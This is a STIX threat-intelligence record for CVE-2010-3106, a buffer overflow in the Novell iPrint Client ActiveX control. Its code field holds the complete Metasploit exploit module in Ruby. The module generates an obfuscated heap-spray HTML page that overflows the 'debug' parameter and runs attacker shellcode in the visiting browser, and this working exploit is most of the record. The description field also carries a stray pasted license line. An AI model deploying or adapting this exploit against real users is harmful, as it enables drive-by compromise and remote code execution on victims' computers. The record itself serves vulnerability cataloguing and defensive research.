{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9a5cbfd-bb1c-4977-8137-93f425c26399",
    "created": "2024-08-14T16:43:38.735832Z",
    "modified": "2024-08-14T16:43:38.735837Z",
    "name": "Novell iPrint Client ActiveX Control ExecuteRequest debug Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in Novell iPrint Client 5.40. When sending an overly long string to the 'debug' parameter in ExecuteRequest() property of ienipp.ocx an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/novelliprint_executerequest_dbg.rb",
            "external_id": "novelliprint_executerequest_dbg.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3106"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# novelliprint_executerequest_dbg.rb\n#\n# Novell iPrint Client ActiveX Control 'debug' Buffer Overflow exploit for the Metasploit Framework\n#\n# Exploit successfully tested on the following platforms:\n#  - Novell iPrint Client 5.32 on Internet Explorer 7, Windows XP SP3\n#  - Novell iPrint Client 5.40 on Internet Explorer 7, Windows XP SP3\n#  - Novell iPrint Client 5.40 on Internet Explorer 7, Windows Vista SP2\n#\n# ienipp.ocx version tested:\n# File Version: 5.3.2.0 and 5.4.0.0\n# ClassID: 36723F97-7AA0-11D4-8919-FF2D71D0D32C\n# RegKey Safe for Script: True\n# RegKey Safe for Init: True\n# KillBitSet: False\n#\n# References:\n#  - CVE-2010-3106\n#  - OSVDB 66960\n#  - http://dvlabs.tippingpoint.com/advisory/TPTI-10-06 - Original advisory by Aaron Portnoy, TippingPoint DVLabs\n#  - https://www.exploit-db.com/exploits/15001/ - MOAUB #14 exploit\n#  - https://www.exploit-db.com/moaub-14-novell-iprint-client-browser-plugin-executerequest-debug-parameter-stack-overflow/ - MOAUB #14 binary analysis\n#  - http://www.rec-sec.com/2010/09/21/novell-iprint-debug-buffer-overflow-exploit/ - Metasploit exploit by Trancer, Recognize-Security\n#\n# Trancer\n# http://www.rec-sec.com\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell iPrint Client ActiveX Control ExecuteRequest debug Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in Novell iPrint Client 5.40.\n        When sending an overly long string to the 'debug' parameter in ExecuteRequest()\n        property of ienipp.ocx an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Trancer <mtrancer[at]gmail.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-3106' ],\n          [ 'OSVDB', '66960'],\n          [ 'URL', 'http://dvlabs.tippingpoint.com/advisory/TPTI-10-06' ],\t# Aaron Portnoy, TippingPoint DVLabs\n          [ 'EDB', '15001' ],\t\t\t\t# MOAUB #14\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP2 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A, 'Offset' => 250 } ]\n        ],\n      'DisclosureDate' => '2010-08-04',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    ret  \t  = Rex::Text.uri_encode([target.ret].pack('L'))\n    blocksize = 0x40000\n    fillto    = 500\n    offset \t  = target['Offset']\n\n    # ActiveX parameters\n    clsid \t= \"36723F97-7AA0-11D4-8919-FF2D71D0D32C\"\n    op\t\t= \"op-client-interface-version\"\n    dbg \t= \"debug=\"\n\n    # Randomize the javascript variable names\n    ienipp       = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_op\t = rand_text_alpha(rand(100) + 1)\n    j_dbg\t = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n    randnop      = rand_text_alpha(rand(100) + 1)\n\n    html = %Q|<html>\n<object classid='clsid:#{clsid}' id='#{ienipp}'></object>\n<script>\nvar #{j_shellcode} = unescape('#{shellcode}');\nvar #{randnop} = \"#{nops}\";\nvar #{j_nops} = unescape(#{randnop});\nvar #{j_headersize} = 20;\nvar #{j_slackspace} = #{j_headersize} + #{j_shellcode}.length;\nwhile (#{j_nops}.length < #{j_slackspace}) #{j_nops} += #{j_nops};\nvar #{j_fillblock} = #{j_nops}.substring(0,#{j_slackspace});\nvar #{j_block} = #{j_nops}.substring(0,#{j_nops}.length - #{j_slackspace});\nwhile (#{j_block}.length + #{j_slackspace} < #{blocksize}) #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};\nvar #{j_memory} = new Array();\nfor (#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++) {\n  #{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode};\n}\n\nvar #{j_ret} = '';\nfor (#{j_counter} = 0; #{j_counter} <= #{offset}; #{j_counter}++) {\n  #{j_ret} += unescape('#{ret}');\n}\n#{j_op} = \"#{op}\";\n#{j_dbg} = \"#{dbg}\";\n#{ienipp}.ExecuteRequest(#{j_op}, #{j_dbg} + #{j_ret});\n</script>\n</html>|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-08-04",
    "x_mitre_platforms": [
        "win'"
    ]
}